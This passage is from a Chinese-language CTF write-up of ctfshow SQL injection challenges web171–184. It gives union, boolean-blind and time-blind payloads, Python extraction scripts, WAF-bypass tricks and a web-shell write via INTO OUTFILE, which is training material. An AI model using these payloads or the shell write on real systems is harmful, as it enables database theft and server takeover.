                    <a href="#web207" aria-label="web207">web207</a></li>
                <li>
                    <a href="#web208" aria-label="web208">web208</a></li>
                <li>
                    <a href="#web209" aria-label="web209">web209</a></li>
                <li>
                    <a href="#web210" aria-label="web210">web210</a></li>
                <li>
                    <a href="#web211" aria-label="web211">web211</a></li>
                <li>
                    <a href="#web212" aria-label="web212">web212</a></li>
                <li>
                    <a href="#web213" aria-label="web213">web213</a></li>
                <li>
                    <a href="#%e6%97%b6%e9%97%b4%e7%9b%b2%e6%b3%a8" aria-label="时间盲注">时间盲注</a></li>
                <li>
                    <a href="#web214" aria-label="web214">web214</a></li>
                <li>
                    <a href="#web215" aria-label="web215">web215</a></li>
                <li>
                    <a href="#web216" aria-label="web216">web216</a></li>
                <li>
                    <a href="#web217" aria-label="web217">web217</a></li>
                <li>
                    <a href="#web218" aria-label="web218">web218</a></li>
                <li>
                    <a href="#web219" aria-label="web219">web219</a></li>
                <li>
                    <a href="#web220" aria-label="web220">web220</a></li>
                <li>
                    <a href="#web221" aria-label="web221">web221</a></li>
                <li>
                    <a href="#group%e6%b3%a8%e5%85%a5" aria-label="group注入">group注入</a></li>
                <li>
                    <a href="#web222" aria-label="web222">web222</a></li>
                <li>
                    <a href="#web223" aria-label="web223">web223</a></li>
                <li>
                    <a href="#web224" aria-label="web224">web224</a></li>
                <li>
                    <a href="#%e5%a0%86%e5%8f%a0%e6%b3%a8%e5%85%a5" aria-label="堆叠注入">堆叠注入</a></li>
                <li>
                    <a href="#web225" aria-label="web225">web225</a></li>
                <li>
                    <a href="#web226" aria-label="web226">web226</a></li>
                <li>
                    <a href="#web227" aria-label="web227">web227</a></li>
                <li>
                    <a href="#web228" aria-label="web228">web228</a></li>
                <li>
                    <a href="#web229" aria-label="web229">web229</a></li>
                <li>
                    <a href="#web230" aria-label="web230">web230</a></li>
                <li>
                    <a href="#update%e6%b3%a8%e5%85%a5" aria-label="update注入">update注入</a></li>
                <li>
                    <a href="#web231" aria-label="web231">web231</a></li>
                <li>
                    <a href="#web232" aria-label="web232">web232</a></li>
                <li>
                    <a href="#web233" aria-label="web233">web233</a><ul>
                        
                <li>
                    <a href="#%e6%96%b9%e6%b3%95%e4%b8%80" aria-label="方法一">方法一</a></li>
                <li>
                    <a href="#%e6%96%b9%e6%b3%95%e4%ba%8c-%e7%9b%b2%e6%b3%a8" aria-label="方法二 ：盲注">方法二 ：盲注</a></li></ul>
                </li>
                <li>
                    <a href="#web234" aria-label="web234">web234</a></li>
                <li>
                    <a href="#web235" aria-label="web235">web235</a></li>
                <li>
                    <a href="#web236" aria-label="web236">web236</a></li>
                <li>
                    <a href="#insert%e6%b3%a8%e5%85%a5" aria-label="insert注入">insert注入</a></li>
                <li>
                    <a href="#web237" aria-label="web237">web237</a></li>
                <li>
                    <a href="#web238" aria-label="web238">web238</a></li>
                <li>
                    <a href="#web239" aria-label="web239">web239</a></li>
                <li>
                    <a href="#web240" aria-label="web240">web240</a></li>
                <li>
                    <a href="#web241" aria-label="web241">web241</a></li>
                <li>
                    <a href="#%e6%96%87%e4%bb%b6%e6%b3%a8%e5%85%a5" aria-label="文件注入">文件注入</a></li>
                <li>
                    <a href="#web242" aria-label="web242">web242</a></li>
                <li>
                    <a href="#web243" aria-label="web243">web243</a></li>
                <li>
                    <a href="#%e6%8a%a5%e9%94%99%e6%b3%a8%e5%85%a5" aria-label="报错注入">报错注入</a></li>
                <li>
                    <a href="#web244" aria-label="web244">web244</a></li>
                <li>
                    <a href="#web245" aria-label="web245">web245</a></li>
                <li>
                    <a href="#web246" aria-label="web246">web246</a></li>
                <li>
                    <a href="#web247" aria-label="web247">web247</a></li>
                <li>
                    <a href="#web248" aria-label="web248">web248</a></li>
                <li>
                    <a href="#web249" aria-label="web249">web249</a></li>
                <li>
                    <a href="#web250" aria-label="web250">web250</a></li>
                <li>
                    <a href="#web251" aria-label="web251">web251</a></li>
                <li>
                    <a href="#web252" aria-label="web252">web252</a></li>
                <li>
                    <a href="#web253" aria-label="web253">web253</a><ul>
                        
                <li>
                    <a href="#%e6%96%b9%e6%b3%95%e4%b8%80-1" aria-label="方法一">方法一</a></li>
                <li>
                    <a href="#%e6%96%b9%e6%b3%95%e4%ba%8c" aria-label="方法二">方法二</a>
                </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h4 id="无过滤注入对输出内容进行过滤"><strong>无过滤注入</strong>（对输出内容进行过滤）<a hidden class="anchor" aria-hidden="true" href="#无过滤注入对输出内容进行过滤">#</a></h4>
<h4 id="web171">web171<a hidden class="anchor" aria-hidden="true" href="#web171">#</a></h4>
<pre tabindex="0"><code>$sql = &#34;select username,password from user where username !=&#39;flag&#39; and id = &#39;&#34;.$_GET[&#39;id&#39;].&#34;&#39; limit 1;&#34;;
</code></pre><p>flag是存在于username为flag的用户的数据中，我们只需要通过</p>
<pre tabindex="0"><code>1&#39; or 1=1 --+
</code></pre><p>即可输出所有用户数据</p>
<h4 id="web172">web172<a hidden class="anchor" aria-hidden="true" href="#web172">#</a></h4>
<p>相比上一题，这题增加了过滤</p>
<pre tabindex="0"><code>//检查结果是否有flag
if($row-&gt;username!==&#39;flag&#39;){
      $ret[&#39;msg&#39;]=&#39;查询成功&#39;;
    }
</code></pre><p>方法一: 联合查询</p>
<p>因为联合查询只会显示password</p>
<pre tabindex="0"><code>api/?id=1&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),database()%23

/api/?id=1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;ctfshow_web&#39;),database()%23

/api/?id=1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;ctfshow_web&#39; and table_name=&#39;ctfshow_user&#39;),database()%23

//看到有3列 id,username,password

/api/?id=1&#39; union select 1,(select group_concat(password) from ctfshow_web.ctfshow_user),database()%23

//查询password发现没有flag

//查另一个表 ctfshow_user2

/api/?id=1&#39; union select 1,(select group_concat(password) from ctfshow_web.ctfshow_user2),database()%23

//看到flag
</code></pre><p>方法二: 将用户名字段进行编码，绕过检测</p>
<pre tabindex="0"><code>-1&#39; union select to_base64(username),password from ctfshow_user2 --+
</code></pre><p>方法三: 只查询密码</p>
<pre tabindex="0"><code>-1&#39; union select id,password from ctfshow_user2 where username=&#39;flag
</code></pre><h4 id="web173">web173<a hidden class="anchor" aria-hidden="true" href="#web173">#</a></h4>
<p>过滤要求查询结果中不能出现flag字段</p>
<pre tabindex="0"><code>//检查结果是否有flag
    if(!preg_match(&#39;/flag/i&#39;, json_encode($ret))){
      $ret[&#39;msg&#39;]=&#39;查询成功&#39;;
    }
</code></pre><p>方法一：联合查询</p>
<p>和上题解法一样，只是这题flag在ctfshow_user3</p>
<p>方法二：</p>
<p>只查询password</p>
<pre tabindex="0"><code>-1&#39; union select id,id,password from ctfshow_user3 where username=&#39;flag
</code></pre><p>方法三: 将用户名字段进行编码，绕过检测</p>
<pre tabindex="0"><code>-1&#39; union select to_base64(username),password from ctfshow_user3 --+
</code></pre><h4 id="web174">web174<a hidden class="anchor" aria-hidden="true" href="#web174">#</a></h4>
<p>输出时增加了过滤数字</p>
<pre tabindex="0"><code>//检查结果是否有flag和数字
    if(!preg_match(&#39;/flag|[0-9]/i&#39;, json_encode($ret))){
      $ret[&#39;msg&#39;]=&#39;查询成功&#39;;
}     
</code></pre><p>由于flag中含有数字，哪怕像之前的通过to_base64等编码后，仍然不可避免数字的出现</p>
<p>所以这题我们要用到布尔盲注</p>
<p>放个脚本</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="c1"># @Author:Y4tacker</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://e076200d-5e74-4121-b2fc-04153243f7a3.chall.ctf.show/api/v4.php?id=1&#39; and &#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;1=if(ascii(substr((select  password from ctfshow_user4 limit 24,1),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s1">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s1">,1,0) -- -&#39;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">if</span> <span class="s2">&#34;admin&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></div><p>又或者通过replace方法将数字替换成其他的合法字符</p>
<pre tabindex="0"><code>1&#39; union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,1,&#39;A&#39;),2,&#39;B&#39;),3,&#39;C&#39;),4,&#39;D&#39;),5,&#39;E&#39;),6,&#39;F&#39;),7,&#39;G&#39;),8,&#39;H&#39;),9,&#39;I&#39;),0,&#39;J&#39;),&#39;b&#39; from ctfshow_user4 where username=&#39;flag&#39; %23
</code></pre><p><img alt="image-20250206225601177" loading="lazy" src="../assets/image-20250206225601177.png"></p>
<p>拿到flag后替换回去就行</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl"> 
</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="n">flag64</span> <span class="o">=</span> <span class="s2">&#34;ctfshow{GHIeaIeG-AGaG-DAab-HHae-eEaFcHFIEbef}&#34;</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl"> 
</span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">flag64</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;A&#34;</span><span class="p">,</span> <span class="s2">&#34;1&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;B&#34;</span><span class="p">,</span> <span class="s2">&#34;2&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;C&#34;</span><span class="p">,</span> <span class="s2">&#34;3&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;D&#34;</span><span class="p">,</span> <span class="s2">&#34;4&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;E&#34;</span><span class="p">,</span> <span class="s2">&#34;5&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;F&#34;</span><span class="p">,</span> <span class="s2">&#34;6&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;G&#34;</span><span class="p">,</span> <span class="s2">&#34;7&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;H&#34;</span><span class="p">,</span> <span class="s2">&#34;8&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;I&#34;</span><span class="p">,</span> <span class="s2">&#34;9&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;J&#34;</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">6</span><span class="cl"> 
</span></span><span class="line"><span class="ln">7</span><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span></code></pre></div><p>又或者</p>
<p><img alt="image-20250207160041895" loading="lazy" src="../assets/image-20250207160041895.png"></p>
<pre tabindex="0"><code>1&#39; union select 1,&#34;&lt;?=eval($_POST[1]);?&gt;&#34; into outfile &#34;/var/www/html/shell.php&#34; --+ 
</code></pre><h4 id="web175">web175<a hidden class="anchor" aria-hidden="true" href="#web175">#</a></h4>
<pre tabindex="0"><code>//检查结果是否有flag
    if(!preg_match(&#39;/[\x00-\x7f]/i&#39;, json_encode($ret))){
      $ret[&#39;msg&#39;]=&#39;查询成功&#39;;
    }
      
</code></pre><p>检查变量 <code>$ret</code> 经过 <code>json_encode</code> 编码后的结果中是否只包含 ASCII 字符（即字符编码范围在 <code>\x00</code> 到 <code>\x7f</code> 之间）。如果不满足这个条件，就将 <code>$ret</code> 数组中的 <code>msg</code> 键的值设置为 <code>'查询成功'</code>。</p>
<p>也就是没有任何回显</p>
<p>方法一：<strong>时间盲注</strong></p>
<p>大佬的脚本，用的二分法</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="c1"># @Author:Y4tacker</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://7eac161c-e06e-4d48-baa5-f11edaee7d38.chall.ctf.show/api/v5.php?id=1&#39; and &#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;1=if(ascii(substr((select  password from ctfshow_user5 limit 24,1),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s1">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s1">,sleep(2),0) -- -&#39;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.5</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></div><p>方法二:利用读写文件写入网站根目录
<a href="http://32a74685-8c52-4756-a326-69a2eb56e70f.challenge.ctf.show/api/v5.php?id=1%27">http://32a74685-8c52-4756-a326-69a2eb56e70f.challenge.ctf.show/api/v5.php?id=1'</a> union select 1,password from ctfshow_user5 into outfile &lsquo;/var/www/html/1.txt&rsquo;&ndash;+&amp;page=1&amp;limit=10
之后访问http://32a74685-8c52-4756-a326-69a2eb56e70f.challenge.ctf.show/1.txt</p>
<h4 id="过滤注入对传入参数进行过滤"><strong>过滤注入</strong>（对传入参数进行过滤）<a hidden class="anchor" aria-hidden="true" href="#过滤注入对传入参数进行过滤">#</a></h4>
<h4 id="web176">web176<a hidden class="anchor" aria-hidden="true" href="#web176">#</a></h4>
<pre tabindex="0"><code>//对传入的参数进行了过滤
  function waf($str){
   //代码过于简单，不宜展示
  }
</code></pre><p>方法一：万能钥匙</p>
<pre tabindex="0"><code>1&#39; or 1=1--+
</code></pre><p><img loading="lazy" src="../assets/image-20250207173909940.png"></p>
<p>能找到flag</p>
<p>方法二:大小写绕过</p>
<pre tabindex="0"><code>1&#39; uNion sElect 1,2,password from ctfshow_user --+
</code></pre><h4 id="web177">web177<a hidden class="anchor" aria-hidden="true" href="#web177">#</a></h4>
<p><strong>黑名单</strong>：空格、+</p>
<p><strong>空格替代</strong>：%20（普通空格）、%09（水平制表符）、%0a（换行符）、%0b（回车符）、%0c（新一页）、%0d（垂直制表符）、%a0、()、``、\**\</p>
<p>可以用\**\绕过</p>
<pre tabindex="0"><code>1&#39;/**/union/**/select/**/password,1,1/**/from/**/ctfshow_user/**/where/**/username/**/=&#39;flag&#39;%23
</code></pre><p>方法二:万能钥匙</p>
<h4 id="web178">web178<a hidden class="anchor" aria-hidden="true" href="#web178">#</a></h4>
<p><strong>黑名单增加</strong>：%20、*</p>
<pre tabindex="0"><code>1&#39;%09union%09select%09password,1,1%09from%09ctfshow_user%09where%09username%09=&#39;flag&#39;%23
</code></pre><p>方法二:万能钥匙</p>
<h4 id="web179">web179<a hidden class="anchor" aria-hidden="true" href="#web179">#</a></h4>
<p><strong>黑名单增加</strong>：%09、%0a、%0b、%0d</p>
<p>这题把%09也过滤了，这题空格可以用%0c绕过</p>
<pre tabindex="0"><code>1&#39;union%0cselect%0c1,2,password%0cfrom%0cctfshow_user%23
</code></pre><h4 id="web180">web180<a hidden class="anchor" aria-hidden="true" href="#web180">#</a></h4>
<p><strong>黑名单增加</strong>：#</p>
<p>可以用&ndash;%0c代替#(%23)</p>
<pre tabindex="0"><code>1&#39;union%0cselect%0c1,2,password%0cfrom%0cctfshow_user--%0c
</code></pre><p>或者直接万能密码</p>
<pre tabindex="0"><code>id=-1&#39;or(id=26)and&#39;1&#39;=&#39;1
</code></pre><h4 id="web181">web181<a hidden class="anchor" aria-hidden="true" href="#web181">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="c1">//对传入的参数进行了过滤
</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="c1"></span>  <span class="k">function</span> <span class="nf">waf</span><span class="p">(</span><span class="nv">$str</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="k">return</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i&#39;</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl">  <span class="p">}</span>
</span></span></code></pre></div><blockquote>
<ul>
<li>
<p><strong><code>/</code> 和 <code>/i</code></strong>：正则表达式的定界符，<code>/</code> 表示正则表达式的开始和结束，<code>i</code> 是修饰符，表示不区分大小写进行匹配。</p>
</li>
<li>
<p><strong><code>|\*</code></strong>：匹配空格字符（）和星号（<code>*</code>），这两个字符在 SQL 注入中可能会被用于构造恶意语句。</p>
</li>
<li>
<p><code>\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0</code></p>
<p>：分别匹配不同的 ASCII 控制字符和特殊空白字符，例如：</p>
<ul>
<li><code>\x09</code>：水平制表符（Tab）</li>
<li><code>\x0a</code>：换行符（LF）</li>
<li><code>\x0b</code>：垂直制表符</li>
<li><code>\x0c</code>：换页符</li>
<li><code>\x00</code>：空字符</li>
<li><code>\x0d</code>：回车符（CR）</li>
<li><code>\xa0</code>：不间断空格</li>
</ul>
</li>
<li>
<p><strong><code>\x23|\#</code></strong>：匹配井号（<code>#</code>），在 SQL 中，<code>#</code> 通常用于注释，攻击者可能会利用注释来绕过 SQL 语句的检查。</p>
</li>
<li>
<p><strong><code>file|into|select</code></strong>：匹配关键字 <code>file</code>、<code>into</code> 和 <code>select</code>，这些关键字在 SQL 注入和文件包含攻击中经常被使用。</p>
</li>
</ul></blockquote>
<p><strong>方法一</strong>  用like来匹配关键词flag</p>
<pre tabindex="0"><code>-1&#39;%0cor%0cusername%0clike%0c&#39;flag
</code></pre><p><strong>方法二</strong></p>
<pre tabindex="0"><code>-1&#39;or(id=26)and&#39;1
</code></pre><p>看到一篇大佬的文章，感觉明了不少</p>
<p><a href="https://exp10it.io/2022/07/ctfshow-web-sqli-171-197-writeup/#web178">ctfshow Web入门SQL注入 web171-197 Writeup - X1r0z Blog</a></p>
<p><img alt="image-20250207214719604" loading="lazy" src="../assets/image-20250207214719604.png"></p>
<h4 id="web182">web182<a hidden class="anchor" aria-hidden="true" href="#web182">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="c1">//对传入的参数进行了过滤
</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="c1"></span>  <span class="k">function</span> <span class="nf">waf</span><span class="p">(</span><span class="nv">$str</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="k">return</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i&#39;</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl">  <span class="p">}</span>
</span></span></code></pre></div><p><strong>黑名单增加</strong>：flag</p>
<p>这题可以用到like进行模糊查询</p>
<p><img alt="image-20250207211733958" loading="lazy" src="../assets/image-20250207211733958.png"></p>
<p>payload:</p>
<pre tabindex="0"><code>-1&#39;or%0cusername%0clike%0c&#39;fl%
</code></pre><p>或者继续使用上一题的方法二</p>
<h4 id="web183">web183<a hidden class="anchor" aria-hidden="true" href="#web183">#</a></h4>
<p>查询语句</p>
<pre tabindex="0"><code>//拼接sql语句查找指定ID用户
$sql = &#34;select count(pass) from &#34;.$_POST[&#39;tableName&#39;].&#34;;&#34;;  
</code></pre><p>返回逻辑</p>
<pre tabindex="0"><code>//对传入的参数进行了过滤
  function waf($str){
    return preg_match(&#39;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#39;, $str);
  }
</code></pre><p>查询结果</p>
<pre tabindex="0"><code>//返回用户表的记录总数
      $user_count = 0;
</code></pre><p>题目大概的意思就是我们传入表名进行查询，如果表名正确，就会返回用户表记录总数1，如果表名错误则返回0，且每次最多只会返回1，根据这个我们可以尝试布尔盲注，如果我们知道表名(ctfshow_user)和列名(pass)，我们就能通过布尔盲注拿到flag</p>
<p>Y4tacker大佬的脚本</p>
<pre tabindex="0"><code>import requests

url = &#39;http://ee0ad3ab-e8f0-4183-97a8-aa3c5bcbe4f4.challenge.ctf.show/select-waf.php&#39;
str = r&#34;{abcdefghijklmnopqrstuvwsyz-0123456789}&#34;
flag = &#34;&#34;
index = 0
while True:
    for i in str:
        data = {
            &#39;tableName&#39;: f&#34;(ctfshow_user)where(substr(pass,{index},1))regexp(&#39;{i}&#39;)&#34;
        }
        r = requests.post(url, data=data)
        if r.text.find(&#34;$user_count = 1;&#34;) &gt; 0:
            flag += i
            print(flag)
            break
    index += 1
</code></pre><p><img alt="image-20250207225938289" loading="lazy" src="../assets/image-20250207225938289.png"></p>
<p>不是为什么我flag的马甲是这样的</p>
<h4 id="web184">web184<a hidden class="anchor" aria-hidden="true" href="#web184">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="c1">//对传入的参数进行了过滤
</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="c1"></span>  <span class="k">function</span> <span class="nf">waf</span><span class="p">(</span><span class="nv">$str</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="k">return</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#39;|\&#34;|union|\`|sleep|benchmark/i&#39;</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl">  <span class="p">}</span>
</span></span></code></pre></div><p>因为这题where被ban了，我们可以利用right join进行代替</p>
<p>依旧是布尔盲注</p>
<p><img alt="image-20250207231215915" loading="lazy" src="../assets/image-20250207231215915.png"></p>
<p>POC</p>
<pre tabindex="0"><code>import requests

url = &#39;http://effed757-6639-46a9-9103-22fedb04bb41.challenge.ctf.show/select-waf.php&#39;
charset = &#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_{}&#39;
flag = &#39;&#39;

for i in range(1, 50):  # 假设 flag 最长 50 个字符
    for j in charset:
        payload = f&#34;ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{i},1) regexp char({ord(j)}))&#34;
        data = {
            &#39;tableName&#39;: payload
        }
        response = requests.post(url, data=data)
        if &#34;some_success_condition&#34; in response.text:
            flag += j
            print(flag)
            break
</code></pre><h4 id="web185">web185<a hidden class="anchor" aria-hidden="true" href="#web185">#</a></h4>
<pre tabindex="0"><code>//对传入的参数进行了过滤
  function waf($str){
